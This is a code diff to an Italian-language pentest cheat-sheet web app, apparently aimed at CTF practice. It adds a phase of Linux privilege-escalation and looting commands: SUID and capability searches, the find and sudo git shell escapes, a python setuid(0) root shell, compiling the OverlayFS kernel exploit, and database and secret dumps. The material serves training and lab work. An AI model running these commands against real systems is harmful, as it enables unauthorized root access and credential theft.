+      {c:"export PATH=/bin:/usr/bin:$PATH", n:"Dopo l'escape, ripristina un PATH normale per riavere accesso a tutti i comandi di sistema.", d:["rbash escape","https://gtfobins.github.io/"]},
     ]
   },
   {
-    id:"loot", idx:"07", name:"Post-Exploitation & Loot", color:"var(--amber)",
-    desc:"Dopo l'accesso: raccogliere credenziali dal database applicativo, decodificare segreti e cercare le flag.",
+    id:"actions", idx:"07", name:"Actions on Objectives", color:"var(--amber)",
+    desc:"Fase 7, l'obiettivo finale. Scalare i privilegi fino a root (sudo, SUID, capabilities, kernel exploit) e poi fare loot: credenziali dal database, segreti nei file, flag user.txt/root.txt.",
     cmds:[
-      {c:"mysql -u <DBUSER> -p<DBPASS> <DBNAME> -e \"show tables;\"", n:"Elenca le tabelle del database applicativo (credenziali spesso estratte da file di config tipo c.php/config.php).", f:[["<DBUSER>","root"],["<DBPASS>","toor"],["<DBNAME>","app_db"]], d:["mysql","https://dev.mysql.com/doc/refman/8.0/en/mysql.html"]},
-      {c:"mysql -u <DBUSER> -p<DBPASS> <DBNAME> -e \"select * from <TABLE>;\"", n:"Dump di una tabella: spesso contiene credenziali applicative in chiaro.", f:[["<DBUSER>","root"],["<DBPASS>","toor"],["<DBNAME>","app_db"],["<TABLE>","users"]], d:["mysql","https://dev.mysql.com/doc/refman/8.0/en/mysql.html"]},
-      {c:"grep -rniE 'pass|pwd|secret|api[_-]?key' <DIR> 2>/dev/null", n:"Cerca credenziali e segreti hardcoded nei file sorgente dell'applicazione.", f:[["<DIR>","/var/www"]], d:["grep","https://man7.org/linux/man-pages/man1/grep.1.html"]},
-      {c:"echo <STRING> | base64 -d", n:"Decodifica blob base64 (chiavi/segreti trovati in pagine o config).", f:[["<STRING>","aGVsbG8="]], d:["base64","https://man7.org/linux/man-pages/man1/base64.1.html"]},
-      {c:"find / -name 'user.txt' -o -name 'root.txt' 2>/dev/null", n:"Cerca le flag tipiche delle CTF su tutto il filesystem.", d:["find","https://man7.org/linux/man-pages/man1/find.1.html"]},
-      {c:"grep -E 'sh$' /etc/passwd", n:"Elenca gli account con shell di login reale: candidati per riuso password su SSH.", d:["passwd(5)","https://man7.org/linux/man-pages/man5/passwd.5.html"]},
+      {c:"whoami; id", n:"Chi sei e a quali gruppi appartieni: il punto di partenza di ogni privilege escalation (gruppi come docker, lxd, disk valgono quasi sempre root).", d:["id","https://man7.org/linux/man-pages/man1/id.1.html"]},
+      {c:"uname -a", n:"Versione di kernel e architettura: serve a cercare kernel exploit applicabili (es. OverlayFS sui kernel 3.13).", d:["uname","https://man7.org/linux/man-pages/man1/uname.1.html"]},
+      {c:"sudo -l", n:"Elenca cosa puoi eseguire via sudo e con quali permessi, magari SENZA password (NOPASSWD). Spesso e' la via piu' diretta e pulita verso root: incrocia i binari con GTFOBins.", d:["sudo","https://www.sudo.ws/docs/man/sudo.man/"]},
+      {c:"find / -perm -u=s -type f 2>/dev/null", n:"Trova i binari con bit SUID: vengono eseguiti con i permessi del proprietario (spesso root). Confronta cio' che trovi con GTFOBins, sezione SUID.", d:["SUID","https://gtfobins.github.io/#+suid"]},
+      {c:"find . -exec /bin/sh \\; -quit", n:"Se 'find' e' SUID, questo apre una shell con i privilegi del proprietario. Esempio diretto di sfruttamento da GTFOBins.", d:["GTFOBins find","https://gtfobins.github.io/gtfobins/find/"]},
+      {c:"find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|dev)'", n:"Elenca i file scrivibili dal tuo utente (esclusi /proc, /sys, /dev). Cerca script/config eseguiti da root (cron, servizi systemd, /etc/passwd, sudoers). Scrivibile NON basta: deve anche essere eseguito da root.", d:["writable files","https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files"]},
+      {c:"getcap -r / 2>/dev/null", n:"Elenca i binari con Linux capabilities: poteri root parziali assegnati a singoli file. Alcune combinazioni valgono una shell root diretta, altre no (vedi il promemoria qui sotto). Non tutte portano a root: incrocia sempre il binario con GTFOBins, sezione Capabilities.", r:"# capabilities che portano a root se le trovi su un binario:\n# cap_setuid       -> root DIRETTO su interpreti (python/perl/ruby/node/php)\n# cap_setgid       -> cambio gruppo, utile combinato con setuid\n# cap_dac_override -> scrivi file protetti (/etc/passwd, /etc/sudoers) -> root\n# cap_dac_read_search -> leggi file protetti (/etc/shadow, chiavi SSH)\n# cap_setfcap      -> assegni capability ad altri binari -> ti crei il caso sopra\n# cap_sys_admin / cap_sys_ptrace -> potenti ma richiedono piu' lavoro\n# (cap_net_raw / cap_net_bind_service di norma NON danno root)", d:["GTFOBins caps","https://gtfobins.github.io/#+capabilities"]},
+      {c:"<BINARIO> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", n:"Se un INTERPRETE ha cap_setuid (da getcap, es. /usr/bin/python3.x cap_setuid=ep), setuid(0) ti rende root. Sostituisci <BINARIO> col percorso esatto. Questa sintassi vale per python; per perl/ruby/node vedi GTFOBins.", f:[["<BINARIO>","/usr/bin/python3.13"]], d:["GTFOBins python caps","https://gtfobins.github.io/gtfobins/python/#capabilities"]},
+      {c:"sudo git -p help config\n!/bin/bash", n:"Se puoi usare git via sudo: apri l'help e, dentro il pager, digita !/bin/bash per una shell root. Pattern 'binario legittimo via sudo -> shell' tipico di GTFOBins.", d:["GTFOBins git","https://gtfobins.github.io/gtfobins/git/"]},
+      {c:"gcc exploit.c -o exploit\n./exploit", n:"SUL target: compila (serve gcc) ed esegui l'exploit del kernel scaricato nella fase Delivery. La compilazione va fatta sul target per allinearla al suo kernel. Per OverlayFS (3.13) l'exploit e' l'EDB 37292.", d:["OverlayFS CVE-2015-1328","https://www.exploit-db.com/exploits/37292"]},
+      {c:"mysql -u <DBUSER> -p<DBPASS> <DBNAME> -e \"show tables;\"", n:"Loot: elenca le tabelle del database applicativo. Le credenziali DB stanno di solito nei file di config dell'app (config.php, c.php, wp-config.php).", f:[["<DBUSER>","root"],["<DBPASS>","toor"],["<DBNAME>","app_db"]], d:["mysql","https://dev.mysql.com/doc/refman/8.0/en/mysql.html"]},
+      {c:"mysql -u <DBUSER> -p<DBPASS> <DBNAME> -e \"select * from <TABLE>;\"", n:"Dump di una tabella: spesso contiene credenziali applicative (a volte in chiaro, a volte hash da crackare).", f:[["<DBUSER>","root"],["<DBPASS>","toor"],["<DBNAME>","app_db"],["<TABLE>","users"]], d:["mysql","https://dev.mysql.com/doc/refman/8.0/en/mysql.html"]},
+      {c:"grep -rniE 'pass|pwd|secret|api[_-]?key' <DIR> 2>/dev/null", n:"Cerca credenziali e segreti hardcoded nei sorgenti dell'applicazione: password di DB, token API, chiavi.", f:[["<DIR>","/var/www"]], d:["grep","https://man7.org/linux/man-pages/man1/grep.1.html"]},
+      {c:"find / -name 'user.txt' -o -name 'root.txt' 2>/dev/null", n:"Cerca le flag tipiche delle CTF su tutto il filesystem: user.txt (utente) e root.txt (root), l'obiettivo finale della macchina.", d:["find","https://man7.org/linux/man-pages/man1/find.1.html"]},
+      {c:"grep -E 'sh$' /etc/passwd", n:"Elenca gli account con una shell di login reale: candidati per il riuso password su SSH o per il pivot verso un altro utente.", d:["passwd(5)","https://man7.org/linux/man-pages/man5/passwd.5.html"]},
     ]
   },
 ];
@@ -411,6 +433,10 @@ function renderCmd(tpl){
   const frag=document.createDocumentFragment();
   tpl.split("\n").forEach((line,li)=>{
     if(li>0) frag.appendChild(document.createElement("br"));
+    if(/^\s*(#|\/\/)/.test(line)){
+      const cm=document.createElement("span"); cm.className="cm"; cm.textContent=line;
+      frag.appendChild(cm); return;
+    }
     const pfx=document.createElement("span");
     pfx.className="pfx"; pfx.textContent="$ "; frag.appendChild(pfx);
     let last=0,m;
@@ -467,7 +493,7 @@ PHASES.forEach(ph=>{
   ph.cmds.forEach(cmd=>{
     const card=document.createElement("div");
     card.className="card"; card.dataset.tpl=cmd.c;
-    card.dataset.search=(cmd.c+" "+cmd.n).toLowerCase();
+    card.dataset.search=(cmd.c+" "+cmd.n+" "+(cmd.r||"")).toLowerCase();
 
     const row=document.createElement("div"); row.className="cmd-row";
     const code=document.createElement("code"); code.className="cmd";
@@ -500,6 +526,15 @@ PHASES.forEach(ph=>{
       foot.appendChild(dl);
     }
 
+    // blocco nota/riferimento: testo di consultazione, non un comando
+    let refEl=null;
+    if(cmd.r){
+      refEl=document.createElement("div"); refEl.className="ref";
+      const rlbl=document.createElement("span"); rlbl.className="ref-lbl"; rlbl.textContent="promemoria";
+      const rbody=document.createElement("div"); rbody.className="ref-body"; rbody.textContent=cmd.r;
+      refEl.appendChild(rlbl); refEl.appendChild(rbody);
+    }
+
     const doCopy=()=>copy(card.dataset.tpl,btn);
     code.addEventListener("click",doCopy);
     btn.addEventListener("click",e=>{e.stopPropagation();doCopy();});
@@ -507,6 +542,7 @@ PHASES.forEach(ph=>{
     card.appendChild(row);
     if(fillEl) card.appendChild(fillEl);
     card.appendChild(foot);
+    if(refEl) card.appendChild(refEl);
     cards.appendChild(card);
   });
 
